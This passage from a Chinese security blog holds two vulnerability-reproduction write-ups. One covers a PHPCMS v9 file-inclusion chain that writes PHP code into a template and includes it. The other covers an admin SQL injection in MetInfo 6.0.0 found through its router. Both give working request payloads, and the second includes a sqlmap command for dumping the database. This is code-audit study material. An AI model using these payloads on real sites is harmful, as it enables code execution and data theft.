<h3 id="POC-0x01"><a href="#POC-0x01" class="headerlink" title="POC 0x01"></a>POC 0x01</h3><p>这里有一个很有意思的地方，那就是我们这里的block_update()，从逻辑上说，这是一段用于更新的代码，然后我们首先，需要先创建一个id，使得数据库中有一个id的数据是可以更新的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!$data = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id))) &#123;</span><br><span class="line">           showmessage(L(<span class="string">'nofound'</span>));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
<p>添加id的代码,跟进add()函数<br>定位phpcms/modules/block/block_admin.php::add() 120行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$pos = <span class="keyword">isset</span>($_GET[<span class="string">'pos'</span>]) &amp;&amp; trim($_GET[<span class="string">'pos'</span>]) ? trim($_GET[<span class="string">'pos'</span>]) : showmessage(L(<span class="string">'illegal_operation'</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">			$name = <span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; trim($_POST[<span class="string">'name'</span>]) ? trim($_POST[<span class="string">'name'</span>]) : showmessage(L(<span class="string">'illegal_operation'</span>), HTTP_REFERER);</span><br><span class="line">			$type = <span class="keyword">isset</span>($_POST[<span class="string">'type'</span>]) &amp;&amp; intval($_POST[<span class="string">'type'</span>]) ? intval($_POST[<span class="string">'type'</span>]) : <span class="number">1</span>;</span><br><span class="line">			<span class="comment">//判断名称是否已经存在</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$name))) &#123;</span><br><span class="line">				showmessage(L(<span class="string">'name'</span>).L(<span class="string">'exists'</span>), HTTP_REFERER);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($id = <span class="keyword">$this</span>-&gt;db-&gt;insert(<span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$name, <span class="string">'pos'</span>=&gt;$pos, <span class="string">'type'</span>=&gt;$type, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid), <span class="keyword">true</span>)) &#123;</span><br><span class="line">				<span class="comment">//设置权限</span></span><br><span class="line">				$priv = <span class="keyword">isset</span>($_POST[<span class="string">'priv'</span>]) ? $_POST[<span class="string">'priv'</span>] : <span class="string">''</span>;</span><br><span class="line">				<span class="keyword">if</span> (!<span class="keyword">empty</span>($priv)) &#123;</span><br><span class="line">					<span class="keyword">if</span> (is_array($priv)) <span class="keyword">foreach</span> ($priv <span class="keyword">as</span> $v) &#123;</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">empty</span>($v)) <span class="keyword">continue</span>;</span><br><span class="line">						<span class="keyword">$this</span>-&gt;priv_db-&gt;insert(<span class="keyword">array</span>(<span class="string">'roleid'</span>=&gt;$v, <span class="string">'blockid'</span>=&gt;$id, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				showmessage(L(<span class="string">'operation_success'</span>), <span class="string">'?m=block&amp;c=block_admin&amp;a=block_update&amp;id='</span>.$id);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				showmessage(L(<span class="string">'operation_failure'</span>), HTTP_REFERER);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$show_header = $show_validator = <span class="keyword">true</span>;</span><br><span class="line">			pc_base::load_sys_class(<span class="string">'form'</span>);</span><br><span class="line">			$administrator = getcache(<span class="string">'role'</span>, <span class="string">'commons'</span>);</span><br><span class="line">			<span class="keyword">unset</span>($administrator[<span class="number">1</span>]);</span><br><span class="line">			<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;admin_tpl(<span class="string">'block_add_edit'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($id = <span class="keyword">$this</span>-&gt;db-&gt;insert(<span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$name, <span class="string">'pos'</span>=&gt;$pos, <span class="string">'type'</span>=&gt;$type, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid), <span class="keyword">true</span>))</span><br></pre></td></tr></table></figure></p>
<p>创建一个id,然后我们现在构造payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=block&amp;c=block_admin&amp;a=add&amp;pos=<span class="number">1</span>&amp;pc_hash=gh43rD</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;name=cookie&amp;type=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p>其中的<strong>type=2</strong>,此参数是为后续准备的。<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/2.png" alt=""></p>
<p>然后插入template参数,payload如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=block&amp;c=block_admin&amp;a=block_update&amp;id=<span class="number">2</span>&amp;pc_hash=iMIUs3</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;name=bb&amp;type=<span class="number">2</span>&amp;url=&amp;thumb=&amp;desc=&amp;template=&#123;php phpinfo();&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个url，是自动跳转的，填入POST参数就行。<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/3.png" alt=""></p>
<p>看一下服务器<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/4.png" alt=""><br>写入成功</p>
<h3 id="POC-0x02"><a href="#POC-0x02" class="headerlink" title="POC 0x02"></a>POC 0x02</h3><p>但是里面的这段话，会因为<strong>‘IN_PHPCMS’</strong>,为false,而退出木马程序，那么一般思路下，我们读取木马文件的思路就不行。</p>
<p>然后看到pc_tag()<br>定位：/phpcms/modules/block/classes/block_tag.class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pc_tag</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		$siteid = <span class="keyword">isset</span>($data[<span class="string">'siteid'</span>]) &amp;&amp; intval($data[<span class="string">'siteid'</span>]) ? intval($data[<span class="string">'siteid'</span>]) : get_siteid();</span><br><span class="line">		$r = <span class="keyword">$this</span>-&gt;db-&gt;select(<span class="keyword">array</span>(<span class="string">'pos'</span>=&gt;$data[<span class="string">'pos'</span>], <span class="string">'siteid'</span>=&gt;$siteid));</span><br><span class="line">		$str = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($r) &amp;&amp; is_array($r)) <span class="keyword">foreach</span> ($r <span class="keyword">as</span> $v) &#123;</span><br><span class="line">			<span class="keyword">if</span> (defined(<span class="string">'IN_ADMIN'</span>) &amp;&amp; !defined(<span class="string">'HTML'</span>)) $str .= <span class="string">'&lt;div id="block_id_'</span>.$v[<span class="string">'id'</span>].<span class="string">'" class="admin_block" blockid="'</span>.$v[<span class="string">'id'</span>].<span class="string">'"&gt;'</span>;</span><br><span class="line">			<span class="keyword">if</span> ($v[<span class="string">'type'</span>] == <span class="string">'2'</span>) &#123;</span><br><span class="line">				extract($v, EXTR_OVERWRITE);</span><br><span class="line">				$data = string2array($data);</span><br><span class="line">				<span class="keyword">if</span> (!defined(<span class="string">'HTML'</span>))  &#123;</span><br><span class="line">					ob_start();</span><br><span class="line">					<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br><span class="line">					$str .= ob_get_contents();</span><br><span class="line">					ob_clean();</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$str .= $v[<span class="string">'data'</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (defined(<span class="string">'IN_ADMIN'</span>)  &amp;&amp; !defined(<span class="string">'HTML'</span>)) $str .= <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br></pre></td></tr></table></figure></p>
<p>文件包含漏洞，然后最骚的就是，全局搜素pc_tag(),会发现在register.php中调用，然后全局搜索register,发现<br>定位：phpcms/modules/link/index.php中有这么一段代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'link'</span>, <span class="string">'register'</span>)</span><br></pre></td></tr></table></figure></p>
<p>跟进后，发现这个函数是可以产生缓存文件的，而这个缓存文件调用了pc_tag()，可包含所以最终payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=link&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/5.png" alt=""></p>
<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>再一次感谢<a href="https://www.freebuf.com/author/wnltc0" target="_blank" rel="noopener">wnltc0师傅</a>，不厌其烦地和我解释我不懂的地方<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/6.png" alt=""></p>
<p>代码审计思路(转的….)<br>方案一：先对核心类库进行审计，如果找到漏洞，那么在网站中可能会存在多处相同的漏洞，就算找不到漏洞，那对核心类库中的方法也多少了解，后面对具体应用功能审计时也会轻松一些</p>
<p>方案二：直接审计功能点，优点：针对性更强；缺点：某个功能点可能调用了多个核心类库中的方法，由于对核心类库不了解，跟读时可能会比较累，需要跟的东西可能会比较多</p>
<p>//无论哪种方案，没耐心是不行滴；如果你审计时正好心烦躁的很，那你可以在安装好应用后，随便点点，开着bp，抓抓改改，发现觉得可能存在问题的点再跟代码，这种方式(有点偏黑盒)能发现一些比较明显的问题，想深入挖掘，建议参考前面两种方案</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/14/在审计中学到的路由利用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/14/在审计中学到的路由利用/" class="post-title-link" itemprop="url">在复现中学到的路由利用</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-14 15:29:52" itemprop="dateCreated datePublished" datetime="2019-07-14T15:29:52+08:00">2019-07-14</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-07-15 10:41:12" itemprop="dateModified" datetime="2019-07-15T10:41:12+08:00">2019-07-15</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><h2 id="0x01-1菜的明明白白"><a href="#0x01-1菜的明明白白" class="headerlink" title="0x01.1菜的明明白白"></a>0x01.1菜的明明白白</h2><p>这两天一直在复现metinfo这个cms,然后看了师傅<a href="https://bbs.ichunqiu.com/home.php?mod=space&amp;uid=191566&amp;do=thread&amp;view=me&amp;from=space" target="_blank" rel="noopener">Ashe</a>的一个帖子，感觉自己又在此学到了一点东西，就对这个cms的路由有了更多理解。的在此记录一下。</p>
<h2 id="0x01-2准备"><a href="#0x01-2准备" class="headerlink" title="0x01.2准备"></a>0x01.2准备</h2><p>metinfo6.0.0<br>php5.5+mysql<br>ubuntu 19</p>
<h1 id="0x02漏洞分析"><a href="#0x02漏洞分析" class="headerlink" title="0x02漏洞分析"></a>0x02漏洞分析</h1><h2 id="Metinfo6-0-0后台sql注入"><a href="#Metinfo6-0-0后台sql注入" class="headerlink" title="Metinfo6.0.0后台sql注入"></a>Metinfo6.0.0后台sql注入</h2><p>就如之前的分析一样，每一个模块，比如message处，或者feedback处都有一个index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message</span></span><br><span class="line">define(<span class="string">'M_NAME'</span>, <span class="string">'message'</span>);</span><br><span class="line">define(<span class="string">'M_MODULE'</span>, <span class="string">'web'</span>);</span><br><span class="line">define(<span class="string">'M_CLASS'</span>, <span class="string">'message'</span>);</span><br><span class="line">define(<span class="string">'M_ACTION'</span>, <span class="string">'domessage'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//feedback</span></span><br><span class="line">define(<span class="string">'M_NAME'</span>, <span class="string">'feedback'</span>);</span><br><span class="line">define(<span class="string">'M_MODULE'</span>, <span class="string">'web'</span>);</span><br><span class="line">define(<span class="string">'M_CLASS'</span>, <span class="string">'feedback'</span>);</span><br><span class="line">define(<span class="string">'M_ACTION'</span>, <span class="string">'dofeedback'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p>每一个index.php里面都包含了entrance.php，然后有定义需要调用的模块，类，方法。这是被写死了。这个cms的特色就在于此。定义了这些的常量，调用方法就会如下所言<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path:/app/system/M_NAME/M_MODULE/M_CLASS.class.php     函数 M_ACTION</span><br></pre></td></tr></table></figure></p>
<p>但是却不能直接调用。<br>大佬的话说就是： 这里奇葩的是他基本都是自己封装好了这些常量，不能随意去调用类函数，如果想随意调用的话需要找入口，而且只能调用函数开头带do字符的函数。</p>
<p>但是我们看向<strong>/admin/index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_ADMIN'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//接口</span></span><br><span class="line">$M_MODULE=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'m'</span>])$M_MODULE=$_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'n'</span>])$_GET[<span class="string">'n'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'c'</span>])$_GET[<span class="string">'c'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'a'</span>])$_GET[<span class="string">'a'</span>]=<span class="string">"doindex"</span>;</span><br><span class="line">@define(<span class="string">'M_NAME'</span>, $_GET[<span class="string">'n'</span>]);</span><br><span class="line">@define(<span class="string">'M_MODULE'</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">'M_CLASS'</span>, $_GET[<span class="string">'c'</span>]);</span><br><span class="line">@define(<span class="string">'M_ACTION'</span>, $_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p>理解这个index.php，这里就相当于一个路口，我们可以通过这个文件作为<strong>任意调用的入口</strong>。</p>
<h2 id="0x02-2demo一下，"><a href="#0x02-2demo一下，" class="headerlink" title="0x02.2demo一下，"></a>0x02.2demo一下，</h2><h3 id="0x02-2-1-在线反馈处后台sql注入"><a href="#0x02-2-1-在线反馈处后台sql注入" class="headerlink" title="0x02.2.1 在线反馈处后台sql注入"></a>0x02.2.1 在线反馈处后台sql注入</h3><p>定位：MetInfo6.0.0/app/system/feedback/admin/feedback_admin.class.php::doexport()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line">$class1 = $_M[form][class1];</span><br><span class="line">$met_fd_export = $_M[form][met_fd_export];</span><br><span class="line">... ... ...</span><br><span class="line">... ... ...</span><br><span class="line"><span class="keyword">foreach</span> ($settings_arr <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">  <span class="keyword">if</span> ($val[<span class="string">'columnid'</span>] == $class1) &#123;</span><br><span class="line">    $tingname = $val[<span class="string">'name'</span>] . <span class="string">'_'</span> . $val[<span class="string">'columnid'</span>];</span><br><span class="line">    $$val[<span class="string">'name'</span>] = $$tingname;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">... ... ...</span><br><span class="line">... ... ...</span><br><span class="line"><span class="keyword">if</span> ($class1) &#123;</span><br><span class="line">  $where .= <span class="string">"AND class1='$class1'"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($met_fd_export == <span class="number">-1</span>) &#123;</span><br><span class="line">  $where = <span class="string">" "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	... ...</span><br><span class="line">&#125; </span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ($_M[<span class="string">'form'</span>][<span class="string">'check_id'</span>] != <span class="string">""</span>) &#123;</span><br><span class="line">  $where .= <span class="string">" AND id in (&#123;$_M['form']['check_id']&#125;)"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"SELECT * FROM &#123;$_M[table][feedback]&#125; where lang='&#123;$this-&gt;lang&#125;' "</span> . $where;</span><br><span class="line">$result = DB::query($query);</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
<p>漏洞成因：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$where .= <span class="string">" AND id in (&#123;$_M['form']['check_id']&#125;)"</span>;</span><br></pre></td></tr></table></figure></p>
<p>其中的<code>$_M[&#39;form&#39;][&#39;check_id&#39;]</code>的是用户可以输入的值，关于用户输入，所有的类继承于common.inc.php的common的这个一级基类<br>其中函数<strong>__construct()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;<span class="comment">//全局数组$_M</span></span><br><span class="line">		ob_start();<span class="comment">//开启缓存</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_mysql();<span class="comment">//数据库连接</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_form();<span class="comment">//表单过滤</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_lang();<span class="comment">//加载语言配置</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_config_global();<span class="comment">//加载全站配置数据</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_url_site();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_config_lang();<span class="comment">//加载当前语言配置数据</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;load_url();<span class="comment">//加载url数据</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟进函数load_form()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">global</span> $_M;</span><br><span class="line">$_M[<span class="string">'form'</span>] =<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">isset</span>($_REQUEST[<span class="string">'GLOBALS'</span>]) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Error'</span>);</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">	$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">	$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">	$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟进daddslashes()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string, $force = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());</span><br><span class="line">	<span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">				$string[$key] = daddslashes($val, $force);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">				$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$string = trim(addslashes($string));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个函数如果仅仅只是对用户输入的值进行addslashes()处理,关于我们是如何绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">				$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$string = trim(addslashes($string));</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为我们在admin/index.php入手，所以在在这个文件中是有设置IN_ADMIN的值为ture<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_ADMIN'</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
<p>所以最终<strong><code>$_M[&#39;form&#39;][&#39;check_id&#39;]</code></strong>，就没有很好的处理过滤。<br>这里放出POC<br><img src="/2019/07/14/在审计中学到的路由利用/1.png" alt=""><br><img src="/2019/07/14/在审计中学到的路由利用/2.png" alt=""><br>这个爆库payload如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"http://xxxx/admin/index.php/?lang=cn&amp;anyid=&amp;n=feedback&amp;c=feedback_admin&amp;a=doexport&amp;class1=&amp;met_fd_export=-1&amp;check_id=1"<span class="comment">--cookie "抓包获取的cookie内容" -p check_id --dbms=mysql –dbs</span></span><br></pre></td></tr></table></figure></p>
<h4 id="——-分割线———"><a href="#——-分割线———" class="headerlink" title="——-分割线———"></a>——-分割线———</h4><p>admin类是可以调用任意类的do函数()，现在分析一下，因为Ashe师傅的payload刚开始没怎么看懂，然后就自己琢磨了一下，整个调用的过程。这里是可以用debug来调试，但是因为最近刚学会这个，还不大会用，所以决定自己手动看看index.php是如何调用doexport()方法的。我菜的明明白白…….</p>
